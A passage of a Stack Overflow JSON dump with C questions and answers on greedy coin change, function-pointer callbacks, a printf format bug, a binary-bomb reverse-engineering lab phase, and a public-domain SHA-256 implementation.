compiles</li>\n<li>does not include header files those contents are not used</li>\n<li>follows the axiom: <em>only one statement per line and (at most) one variable declaration per statement.</em></li>\n<li>performs the desired functionality</li>\n<li>performs appropriate error checking</li>\n<li>performs a 'greedy' algorithm of consuming as much of the 'money' as quickly as possible, using the least number of 'bills'</li>\n</ol>\n\n<p>and now, the proposed code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n\nint main( void )\n{\n    int sum;\n\n    do\n    {\n        printf(\"Enter a sum of money in range 1 to 999\\n\");\n        if( scanf(\"%d\",&amp;sum) != 1)\n        {\n            fprintf( stderr, \"scanf failed\\n\");\n            return -1;\n        }       \n    } while( sum&lt;0 || sum&gt;999 );\n\n    int hundreds = sum/100;\n    sum          = sum % 100;\n    int tens     = sum/10;\n    sum          = sum % 10;\n    int ones     = sum;\n\n    printf(\"%d $100, %d $10, %d $1\\n\",hundreds,tens,ones);\n}\n</code></pre>\n\n<p>The proposed code ignores the (American) bills $50, $20, $5, and $2</p>\n"}], "owner": {"reputation": 120, "user_id": 4080322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d28464b305895662d6d0defe2baf7542?s=128&d=identicon&r=PG&f=1", "display_name": "Divyanshu Varma", "link": "https://stackoverflow.com/users/4080322/divyanshu-varma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 55029237, "answer_count": 3, "score": -1, "last_activity_date": 1551979397, "creation_date": 1551893076, "last_edit_date": 1551893807, "question_id": 55028888, "link": "https://stackoverflow.com/questions/55028888/determine-the-minimum-number-of-coins-required-for-giving-a-change-using-greedy", "title": "Determine the minimum number of coins required for giving a change using greedy approach", "body": "<p>As an assignment for my course on Design and Analysis of Algorithms, I was asked to determine the minimum number of coins required for giving a change, using a greedy approach. I came up with this intuitive approach:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nint main(){\n  int hundreds=0,tens=0,ones=0,sum=0;\n\n  printf(\"Enter a sum of money in range 1 to 999\\n\");\n  scanf(\"%d\",&amp;sum);\n  while(sum!=0) {\n    if (sum&lt;10&amp;&amp;sum&gt;=1){\n      ones=sum/1;\n      sum-=ones;\n    }\n    else if(sum&gt;=10&amp;&amp;sum&lt;100){\n      tens=sum/10;\n      sum-=tens*10;\n    }\n    else if(sum&gt;=100&amp;&amp;sum&lt;=999){\n      hundreds=sum/100;\n      sum-=hundreds*100;\n    }\n    else{\n      printf(\"Error\");\n      exit(0);\n    }\n  }\n\n  printf(\"%d $100, %d $10, %d $1\",hundreds,tens,ones);\n  return 0;\n}\n</code></pre>\n\n<p>Is this approach greedy? \nHow do I prove that the program is correct and uses the greedy approach?</p>\n"}, {"tags": ["c", "pointers", "segmentation-fault"], "comments": [{"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 1, "creation_date": 1551892910, "post_id": 55028788, "comment_id": 96810316, "body": "The library&#39;s code is part of your process&#39; memory too, whether it is statically or dynamically linked."}, {"owner": {"reputation": 910, "user_id": 6422591, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/wIpwn.jpg?s=128&g=1", "display_name": "manish ma", "link": "https://stackoverflow.com/users/6422591/manish-ma"}, "reply_to_user": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 0, "creation_date": 1551893053, "post_id": 55028788, "comment_id": 96810405, "body": "So if I have multiple processes using this library, it shares its memory with all of them?"}, {"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 1, "creation_date": 1551905557, "post_id": 55028788, "comment_id": 96816498, "body": "No, each process gets its own copy of the library in its own virtual address space."}], "answers": [{"tags": [], "owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "is_accepted": true, "score": 3, "last_activity_date": 1551906194, "creation_date": 1551906194, "answer_id": 55032082, "question_id": 55028788, "link": "https://stackoverflow.com/questions/55028788/how-come-function-pointers-passed-to-a-library-as-callback-dont-cause-segment/55032082#55032082", "title": "How come function pointers passed to a library (as callback) don&#39;t cause segmentation fault when executed?", "body": "<p>It's not a problem because the function itself will never exist on the stack frame.</p>\n\n<p>Suppose you have this code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid (*fptr)(void);\nint num;\n\nvoid g(void) {\n    printf(\"Hello, world!\\n\");\n}\n\nint f(void) {\n    int a = 42;\n    num = a;\n\n    void (*p)(void) = &amp;g;\n    fptr = p;\n}\n\nint main(void) {\n    f();\n\n    printf(\"%d\\n\", num);\n    fptr();\n}\n</code></pre>\n\n<p>In <code>f</code>, we set both <code>fptr</code> and <code>num</code> to the <em>value</em> of a local variable.  If we tried to reference <code>a</code> or <code>p</code> after <code>f</code> returns, we'd have trouble, but we never do. </p>\n\n<p><code>fptr</code> doesn't contain <code>p</code>; it contains <code>&amp;g</code>, which is just a constant that happens to be where the function <code>g</code> is located in memory. And <code>g</code> continues to exist at that spot after <code>f</code> returns, because the function itself is not a local variable.</p>\n\n<p>And this is what happens when you set up a callback; somewhere in that library is a variable that gets assigned the address of the function you passed.</p>\n"}], "owner": {"reputation": 910, "user_id": 6422591, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/wIpwn.jpg?s=128&g=1", "display_name": "manish ma", "link": "https://stackoverflow.com/users/6422591/manish-ma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "accepted_answer_id": 55032082, "answer_count": 1, "score": 0, "last_activity_date": 1551906194, "creation_date": 1551892779, "question_id": 55028788, "link": "https://stackoverflow.com/questions/55028788/how-come-function-pointers-passed-to-a-library-as-callback-dont-cause-segment", "title": "How come function pointers passed to a library (as callback) don&#39;t cause segmentation fault when executed?", "body": "<p>I recently implemented the functionality of callback registration with a dynamic library using function pointers.\nSo this means I passed a variable which is located on my local Stack Frame.\nHow can the library access this variable without crashing for memory access violation?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1551892025, "post_id": 55028499, "comment_id": 96809720, "body": "thanks mate .but about displaying the float it doesn&#39;t display them it only displays the names"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 2, "creation_date": 1551892662, "post_id": 55028499, "comment_id": 96810168, "body": "@xing The strange printf has two format strings, each followed by a argument - and is far from a correct use of printf. Probably helpful: <code>printf(&quot;Nom Etudiant: %s| Moyen= %f \\n&quot;, E.nom, E.moy);</code>"}, {"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 0, "creation_date": 1551904705, "post_id": 55028499, "comment_id": 96816146, "body": "The const pointer-to-function null test <code>if(fwrite!=0)</code> is always true; one probably intended to set a variable to the value that <code>fwrite</code> returns, and then test that value."}], "answers": [{"tags": [], "owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "is_accepted": true, "score": 0, "last_activity_date": 1551892767, "creation_date": 1551892767, "answer_id": 55028782, "question_id": 55028499, "link": "https://stackoverflow.com/questions/55028499/i-cant-understand-why-it-doesnt-display-the-float-in-the-file-binary-file/55028782#55028782", "title": "I can&#39;t understand why it doesn&#39;t display the float in the file (binary file)", "body": "<p>In order to get the name and the moyen, change</p>\n\n<pre><code>printf(\"Nom Etudiant: %s\",E.nom,\"| Moyen= %f \\n\",E.moy);\n</code></pre>\n\n<p>to</p>\n\n<pre><code>printf(\"Nom Etudiant: %s| Moyen= %f \\n\", E.nom, E.moy);\n</code></pre>\n\n<p>This is necessary, because printf always takes a single format string and then all the arguments. If the first string only describes a single argument, the others will be ignored.<br>\nIn your code, the second argument is the second half of the format string and the third argument is the moyen you are missing in the output. Both are ignored.</p>\n\n<p>With the single, longer format string as proposed, two arguments are described, so both are found and used and both end up in the output.</p>\n"}], "owner": {"reputation": 37, "user_id": 11091643, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s7F5o_n7qn4/AAAAAAAAAAI/AAAAAAAAArQ/gDpkNU9MCwg/photo.jpg?sz=128", "display_name": "Ayoub Souid", "link": "https://stackoverflow.com/users/11091643/ayoub-souid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 37, "favorite_count": 0, "accepted_answer_id": 55028782, "answer_count": 1, "score": 1, "last_activity_date": 1551892986, "creation_date": 1551891765, "last_edit_date": 1551892986, "question_id": 55028499, "link": "https://stackoverflow.com/questions/55028499/i-cant-understand-why-it-doesnt-display-the-float-in-the-file-binary-file", "title": "I can&#39;t understand why it doesn&#39;t display the float in the file (binary file)", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\nstruct etudiant{\n  char nom[10];\n  float moy;\n};\n\nvoid AjoutEtudiant(struct etudiant E,FILE *ficheierEtudiant) {\n  ficheierEtudiant = fopen(\"C:/Users/Ayoub/Desktop/TDTP/Ex1/Etudiant.dat\",\"w\");\n  char rep;\n\n  do{\n    printf(\"Saisir nom etudiant a Ajouter: \");\n    scanf(\"%s\",&amp;E.nom);\n    printf(\"Saisir son Moyen: \");\n    scanf(\"%f\",&amp;E.moy);\n    fwrite (&amp;E, sizeof(struct etudiant), 1,ficheierEtudiant);\n    if(fwrite!=0){\n        printf(\"\\n\\nEtudaint Ajouter avec succees !\\n\\n\");\n    }\n    printf(\"\\nvoulez vouz Ajouter un autre etudiant? (O,N): \");\n    scanf(\"%s\",&amp;rep);\n  } while(toupper(rep)!='N');\n\n  fclose(ficheierEtudiant);\n}\n\nvoid EcrireListeEtudiant(struct etudiant E, FILE* fichierEtudiant) {\n fichierEtudiant=fopen(\"C:/Users/Ayoub/Desktop/TDTP/Ex1/Etudiant.dat\",\"rb\");\n  while(fread(&amp;E,sizeof(struct etudiant),1,fichierEtudiant))\n    printf(\"Nom Etudiant: %s\",E.nom,\"| Moyen= %f \\n\",E.moy);\n\n  fclose(fichierEtudiant);\n}\n\nint main()\n{\n   FILE *fichierEtudiant;\n   struct etudiant E;\n\n   AjoutEtudiant(E,fichierEtudiant);\n   EcrireListeEtudiant(E,fichierEtudiant);\n}\n</code></pre>\n\n<p>I add names and their marks (float) in the file but when I try to display them it only shows the name and ignore the float parts in the file!  I have tried many ways but ended up messing it up.  Can someone help me to understand the issue?</p>\n"}, {"tags": ["c", "linux", "assembly", "x86", "gdb"], "comments": [{"owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1551894977, "post_id": 55028487, "comment_id": 96811479, "body": "<code>8(%esp)</code> is the second number you entered. If you have debugged the code to that point, you know what you need to enter for any first number.  If your claim is correct then e.g. <code>2 40</code> should work."}], "answers": [{"tags": [], "owner": {"reputation": 729, "user_id": 11060870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a74dd465c0373f529ebe6f9ee7592add?s=128&d=identicon&r=PG", "display_name": "ccxxshow", "link": "https://stackoverflow.com/users/11060870/ccxxshow"}, "is_accepted": true, "score": 1, "last_activity_date": 1551943423, "creation_date": 1551943423, "answer_id": 55038157, "question_id": 55028487, "link": "https://stackoverflow.com/questions/55028487/how-to-defuse-this-binary-bomb-phase-4/55038157#55038157", "title": "how to defuse this binary bomb phase 4", "body": "<p><code>8(%esp)</code> is the first number, under the framework of x86.\nenter <code>40 2</code> or <code>60 3</code> or <code>80 4</code> should work.</p>\n\n<p>Equivalent to the following logic</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid explode_bomb()\n{\n    printf(\"explode bomb.\\n\");\n    exit(1);\n}\n\nunsigned func4(int val, unsigned num)\n{\n    int ret;\n\n    if (val &lt;= 0)\n        return 0;\n\n    if (num == 1)\n        return 1;\n\n    ret = func4(val - 1, num);\n    ret += num;\n    val -= 2;\n    ret += func4(val, num);\n    return ret;\n}\n\nvoid phase_4(const char *input)\n{\n    unsigned num1, num2;\n\n    if (sscanf(input, \"%u %u\", &amp;num1, &amp;num2) != 2)\n        explode_bomb();\n\n    if (num2 - 2 &gt; 2)\n        explode_bomb();\n\n    if (func4(6, num2) != num1)\n        explode_bomb();\n}\n\nint main()\n{\n    phase_4(\"40 2\");\n    phase_4(\"60 3\");\n    phase_4(\"80 4\");\n    printf(\"success.\\n\");\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 8869444, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a623ed6f7fb5ef31e5e0631d4b3b9de?s=128&d=identicon&r=PG&f=1", "display_name": "Henry Chen", "link": "https://stackoverflow.com/users/8869444/henry-chen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 759, "favorite_count": 0, "accepted_answer_id": 55038157, "answer_count": 1, "score": 2, "last_activity_date": 1551943423, "creation_date": 1551891721, "question_id": 55028487, "link": "https://stackoverflow.com/questions/55028487/how-to-defuse-this-binary-bomb-phase-4", "title": "how to defuse this binary bomb phase 4", "body": "<p>I am having trouble this piece of code in assembly language.\nEssentially I have to input 2 numbers that matches 2 numbers the code is comparing with. \nOn line 0x08048c47 in phase_4, it compares the first input with 2, so I know the first input has to be 2. It then moves 4 spaces from the first input to next input, which then gets 2 subtracted from it. Now the (input-2) is compared with 2. It will continue the instruction if the inputs are below than or equal to 2. I've tested this with numbers 2,3,4 which pass the comparison. Other numbers greater than 4 and less than 2 do not pass the comparison and will cause the bomb to explode.<br>\nI'm stuck on this part because the value being returned from func4 is not the same was the value represented at  0x08048c6e in phase_4, which is 8(%esp). On my computer when I debug it, it shows that it is 8, and the answers to my inputs 2,3,4 are 40, 60, 80 respectively.</p>\n\n<pre><code>disas func4\n0x08048bda &lt;+0&gt;:    push   %edi\n0x08048bdb &lt;+1&gt;:    push   %esi\n0x08048bdc &lt;+2&gt;:    push   %ebx\n0x08048bdd &lt;+3&gt;:    mov    0x10(%esp),%ebx\n0x08048be1 &lt;+7&gt;:    mov    0x14(%esp),%edi\n0x08048be5 &lt;+11&gt;:   test   %ebx,%ebx\n0x08048be7 &lt;+13&gt;:   jle    0x8048c14 &lt;func4+58&gt;\n0x08048be9 &lt;+15&gt;:   mov    %edi,%eax\n0x08048beb &lt;+17&gt;:   cmp    $0x1,%ebx\n0x08048bee &lt;+20&gt;:   je     0x8048c19 &lt;func4+63&gt;\n0x08048bf0 &lt;+22&gt;:   sub    $0x8,%esp\n0x08048bf3 &lt;+25&gt;:   push   %edi\n0x08048bf4 &lt;+26&gt;:   lea    -0x1(%ebx),%eax\n0x08048bf7 &lt;+29&gt;:   push   %eax\n0x08048bf8 &lt;+30&gt;:   call   0x8048bda &lt;func4&gt;\n0x08048bfd &lt;+35&gt;:   add    $0x8,%esp\n0x08048c00 &lt;+38&gt;:   lea    (%edi,%eax,1),%esi\n0x08048c03 &lt;+41&gt;:   push   %edi\n0x08048c04 &lt;+42&gt;:   sub    $0x2,%ebx\n0x08048c07 &lt;+45&gt;:   push   %ebx\n0x08048c08 &lt;+46&gt;:   call   0x8048bda &lt;func4&gt;\n0x08048c0d &lt;+51&gt;:   add    $0x10,%esp\n0x08048c10 &lt;+54&gt;:   add    %esi,%eax\n0x08048c12 &lt;+56&gt;:   jmp    0x8048c19 &lt;func4+63&gt;\n0x08048c14 &lt;+58&gt;:   mov    $0x0,%eax\n0x08048c19 &lt;+63&gt;:   pop    %ebx\n0x08048c1a &lt;+64&gt;:   pop    %esi\n0x08048c1b &lt;+65&gt;:   pop    %edi\n0x08048c1c &lt;+66&gt;:   ret    \n\n\n\ndisas phase_4\n0x08048c1d &lt;+0&gt;:    sub    $0x1c,%esp\n0x08048c20 &lt;+3&gt;:    mov    %gs:0x14,%eax\n0x08048c26 &lt;+9&gt;:    mov    %eax,0xc(%esp)\n0x08048c2a &lt;+13&gt;:   xor    %eax,%eax\n0x08048c2c &lt;+15&gt;:   lea    0x4(%esp),%eax\n0x08048c30 &lt;+19&gt;:   push   %eax\n0x08048c31 &lt;+20&gt;:   lea    0xc(%esp),%eax\n0x08048c35 &lt;+24&gt;:   push   %eax\n0x08048c36 &lt;+25&gt;:   push   $0x804a25f\n0x08048c3b &lt;+30&gt;:   pushl  0x2c(%esp)\n0x08048c3f &lt;+34&gt;:   call   0x8048810 &lt;__isoc99_sscanf@plt&gt;\n0x08048c44 &lt;+39&gt;:   add    $0x10,%esp\n0x08048c47 &lt;+42&gt;:   cmp    $0x2,%eax\n0x08048c4a &lt;+45&gt;:   jne    0x8048c58 &lt;phase_4+59&gt;\n0x08048c4c &lt;+47&gt;:   mov    0x4(%esp),%eax\n0x08048c50 &lt;+51&gt;:   sub    $0x2,%eax\n0x08048c53 &lt;+54&gt;:   cmp    $0x2,%eax\n0x08048c56 &lt;+57&gt;:   jbe    0x8048c5d &lt;phase_4+64&gt;\n0x08048c58 &lt;+59&gt;:   call   0x8049123 &lt;explode_bomb&gt;\n0x08048c5d &lt;+64&gt;:   sub    $0x8,%esp\n0x08048c60 &lt;+67&gt;:   pushl  0xc(%esp)\n0x08048c64 &lt;+71&gt;:   push   $0x6\n0x08048c66 &lt;+73&gt;:   call   0x8048bda &lt;func4&gt;\n0x08048c6b &lt;+78&gt;:   add    $0x10,%esp\n0x08048c6e &lt;+81&gt;:   cmp    0x8(%esp),%eax\n0x08048c72 &lt;+85&gt;:   je     0x8048c79 &lt;phase_4+92&gt;\n0x08048c74 &lt;+87&gt;:   call   0x8049123 &lt;explode_bomb&gt;\n0x08048c79 &lt;+92&gt;:   mov    0xc(%esp),%eax\n0x08048c7d &lt;+96&gt;:   xor    %gs:0x14,%eax\n0x08048c84 &lt;+103&gt;:  je     0x8048c8b &lt;phase_4+110&gt;\n0x08048c86 &lt;+105&gt;:  call   0x8048790 &lt;__stack_chk_fail@plt&gt;\n0x08048c8b &lt;+110&gt;:  add    $0x1c,%esp\n0x08048c8e &lt;+113&gt;:  ret    \n</code></pre>\n"}, {"tags": ["c", "hash", "sha256"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 5, "creation_date": 1551891469, "post_id": 55028350, "comment_id": 96809353, "body": "There&#39;s innumerable implementations of SHA256 in C. Throw a rock at a search engine and you&#39;re bound to hit one."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1551891518, "post_id": 55028350, "comment_id": 96809383, "body": "Google &quot;sha256 c source&quot;"}, {"owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "edited": false, "score": 0, "creation_date": 1551892868, "post_id": 55028350, "comment_id": 96810293, "body": "<a href=\"https://codereview.stackexchange.com/questions/182812/self-contained-sha-256-implementation-in-c\" title=\"self contained sha 256 implementation in c\">codereview.stackexchange.com/questions/182812/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 0, "last_activity_date": 1551911336, "creation_date": 1551911336, "answer_id": 55033209, "question_id": 55028350, "link": "https://stackoverflow.com/questions/55028350/hash-value-from-c-function/55033209#55033209", "title": "Hash value from C function", "body": "<p>Your code has undefined behavior because you return a pointer to <code>result</code>, a local array with automatic storage. Reading from this array by the caller has undefined behavior.</p>\n\n<p>You should at least make <code>result</code> static so its contents remain readable after <code>EncryptSHA256</code> returns to its caller.</p>\n\n<p>Regarding the inefficiency of the method, here is a public domain implementation of SHA256 that you can use directly inside your program:</p>\n\n<pre><code>/* public domain sha256 implementation based on fips180-3 */\n\n#include &lt;stddef.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;string.h&gt;\n\n/* Public API */\n\nstruct sha256 {\n    uint64_t len;    /* processed message length */\n    uint32_t h[8];   /* hash state */\n    uint8_t buf[64]; /* message block buffer */\n};\n\n/* reset state */\nvoid sha256_init(struct sha256 *s);\n/* process message */\nvoid sha256_update(struct sha256 *s, const void *m, size_t len);\n/* get message digest */\n/* state is ruined after sum, keep a copy if multiple sum is needed */\n/* part of the message might be left in s, zero it if secrecy is needed */\nvoid sha256_sum(struct sha256 *s, uint8_t md[32]);\n\n/* Implementation */\n\nstatic uint32_t ror(uint32_t n, int k) {\n    return (n &gt;&gt; k) | (n &lt;&lt; (32 - k));\n}\n#define Ch(x,y,z)  (z ^ (x &amp; (y ^ z)))\n#define Maj(x,y,z) ((x &amp; y) | (z &amp; (x | y)))\n#define S0(x)      (ror(x,2) ^ ror(x,13) ^ ror(x,22))\n#define S1(x)      (ror(x,6) ^ ror(x,11) ^ ror(x,25))\n#define R0(x)      (ror(x,7) ^ ror(x,18) ^ (x&gt;&gt;3))\n#define R1(x)      (ror(x,17) ^ ror(x,19) ^ (x&gt;&gt;10))\n\nstatic const uint32_t K[64] = {\n    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,\n    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,\n    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,\n    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,\n    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,\n    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\n    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,\n    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,\n    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,\n    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,\n    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,\n    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\n    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,\n    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,\n    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,\n    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2\n};\n\nstatic void processblock(struct sha256 *s, const uint8_t *buf) {\n    uint32_t W[64], t1, t2, a, b, c, d, e, f, g, h;\n    int i;\n\n    for (i = 0; i &lt; 16; i++) {\n        W[i]  = (uint32_t)buf[4 * i + 0] &lt;&lt; 24;\n        W[i] |= (uint32_t)buf[4 * i + 1] &lt;&lt; 16;\n        W[i] |= (uint32_t)buf[4 * i + 2] &lt;&lt; 8;\n        W[i] |= buf[4 * i + 3];\n    }\n    for (; i &lt; 64; i++)\n        W[i] = R1(W[i-2]) + W[i-7] + R0(W[i-15]) + W[i-16];\n    a = s-&gt;h[0];\n    b = s-&gt;h[1];\n    c = s-&gt;h[2];\n    d = s-&gt;h[3];\n    e = s-&gt;h[4];\n    f = s-&gt;h[5];\n    g = s-&gt;h[6];\n    h = s-&gt;h[7];\n#define ROUND(a,b,c,d,e,f,g,h,i) \\\n        t1 = h + S1(e) + Ch(e,f,g) + K[i] + W[i]; \\\n        t2 = S0(a) + Maj(a,b,c); \\\n        d += t1; \\\n        h = t1 + t2;\n    for (i = 0; i &lt; 64; ) {\n        ROUND(a, b, c, d, e, f, g, h, i); i++;\n        ROUND(h, a, b, c, d, e, f, g, i); i++;\n        ROUND(g, h, a, b, c, d, e, f, i); i++;\n        ROUND(f, g, h, a, b, c, d, e, i); i++;\n        ROUND(e, f, g, h, a, b, c, d, i); i++;\n        ROUND(d, e, f, g, h, a, b, c, i); i++;\n        ROUND(c, d, e, f, g, h, a, b, i); i++;\n        ROUND(b, c, d, e, f, g, h, a, i); i++;\n    }\n#undef ROUND\n    s-&gt;h[0] += a;\n    s-&gt;h[1] += b;\n    s-&gt;h[2] += c;\n    s-&gt;h[3] += d;\n    s-&gt;h[4] += e;\n    s-&gt;h[5] += f;\n    s-&gt;h[6] += g;\n    s-&gt;h[7] += h;\n}\n\nstatic void pad(struct sha256 *s) {\n    unsigned r = s-&gt;len % 64;\n\n    s-&gt;buf[r++] = 0x80;\n    if (r &gt; 56) {\n        memset(s-&gt;buf + r, 0, 64 - r);\n        r = 0;\n        processblock(s, s-&gt;buf);\n    }\n    memset(s-&gt;buf + r, 0, 56 - r);\n    s-&gt;len *= 8;\n    s-&gt;buf[56] = s-&gt;len &gt;&gt; 56;\n    s-&gt;buf[57] = s-&gt;len &gt;&gt; 48;\n    s-&gt;buf[58] = s-&gt;len &gt;&gt; 40;\n    s-&gt;buf[59] = s-&gt;len &gt;&gt; 32;\n    s-&gt;buf[60] = s-&gt;len &gt;&gt; 24;\n    s-&gt;buf[61] = s-&gt;len &gt;&gt; 16;\n    s-&gt;buf[62] = s-&gt;len &gt;&gt; 8;\n    s-&gt;buf[63] = s-&gt;len;\n    processblock(s, s-&gt;buf);\n}\n\nvoid sha256_init(struct sha256 *s) {\n    s-&gt;len = 0;\n    s-&gt;h[0] = 0x6a09e667;\n    s-&gt;h[1] = 0xbb67ae85;\n    s-&gt;h[2] = 0x3c6ef372;\n    s-&gt;h[3] = 0xa54ff53a;\n    s-&gt;h[4] = 0x510e527f;\n    s-&gt;h[5] = 0x9b05688c;\n    s-&gt;h[6] = 0x1f83d9ab;\n    s-&gt;h[7] = 0x5be0cd19;\n}\n\nvoid sha256_sum(struct sha256 *s, uint8_t md[20]) {\n    int i;\n\n    pad(s);\n    for (i = 0; i &lt; 8; i++) {\n        md[4 * i + 0] = s-&gt;h[i] &gt;&gt; 24;\n        md[4 * i + 1] = s-&gt;h[i] &gt;&gt; 16;\n        md[4 * i + 2] = s-&gt;h[i] &gt;&gt; 8;\n        md[4 * i + 3] = s-&gt;h[i];\n    }\n}\n\nvoid sha256_update(struct sha256 *s, const void *m, unsigned long len) {\n    const uint8_t *p = m;\n    unsigned r = s-&gt;len % 64;\n\n    s-&gt;len += len;\n    if (r) {\n        if (len &lt; 64 - r) {\n            memcpy(s-&gt;buf + r, p, len);\n            return;\n        }\n        memcpy(s-&gt;buf + r, p, 64 - r);\n        len -= 64 - r;\n        p += 64 - r;\n        processblock(s, s-&gt;buf);\n    }\n    for (; len &gt;= 64; len -= 64, p += 64)\n        processblock(s, p);\n    memcpy(s-&gt;buf, p, len);\n}\n</code></pre>\n\n<p>You would change your function to this:</p>\n\n<pre><code>const char *EncryptSHA256(char *Arg1) {  \n    struct sha256 s;\n    unsigned char md[32];\n    static char result[65];\n\n    sha256_init(&amp;s);\n    sha256_update(&amp;s, Arg1, strlen(Arg1));\n    sha256_sum(&amp;s, md);\n    for (int i = 0; i &lt; 32; i++) {\n        sprintf(result + i * 2, \"%02x\", md[i]);\n    }\n    return 